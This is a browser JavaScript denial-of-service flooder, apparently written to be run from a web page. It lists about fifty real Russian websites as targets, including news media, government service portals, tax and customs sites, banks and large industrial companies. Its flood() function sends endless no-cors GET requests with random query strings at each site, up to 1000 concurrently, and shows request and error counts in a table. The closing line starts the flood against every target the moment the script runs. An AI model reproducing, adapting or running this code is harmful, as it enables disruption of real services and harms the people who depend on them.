var targets = {
  'https://lenta.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://ria.ru/lenta/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.rt.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'http://kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'http://en.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://smotrim.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://tass.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://tvzvezda.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://vsoloviev.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.1tv.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.vesti.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://online.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://zakupki.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.gosuslugi.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://er.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.rzd.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://rzdlog.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://vgtrk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.interfax.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.mos.ru/uslugi/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'http://government.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://mil.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.nalog.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://customs.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://pfr.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://rkn.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.gazprombank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.vtb.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.gazprom.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://lukoil.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://magnit.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.nornickel.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.surgutneftegas.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.tatneft.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.evraz.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://nlmk.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.sibur.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.severstal.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.metalloinvest.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://nangs.org/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://rmk-group.ru/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.tmk-group.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://ya.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.polymetalinternational.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.uralkali.com/ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://www.eurosib.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://ugmk.ua/': { number_of_requests: 0, number_of_errored_responses: 0 },
  'https://omk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 }, 
}

var statsEl = document.getElementById('stats');
function printStats() {
  statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
}
setInterval(printStats, 1000);

var CONCURRENCY_LIMIT = 1000
var queue = []

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    method: 'GET',
    mode: 'no-cors',
    signal: controller.signal
  }).then((response) => {
    clearTimeout(id);
    return response;
  }).catch((error) => {
    clearTimeout(id);
    throw error;
  });
}

async function flood(target) {
  for (var i = 0;; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift()
    }
    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
    queue.push(
      fetchWithTimeout(target+rand, { timeout: 1000 })
        .catch((error) => {
          if (error.code === 20 /* ABORT */) {
            return;
          }
          targets[target].number_of_errored_responses++;
        })
        .then((response) => {
          if (response && !response.ok) {
            targets[target].number_of_errored_responses++;
          }
          targets[target].number_of_requests++;
        })

    )
  }
}

// Start
Object.keys(targets).map(flood)
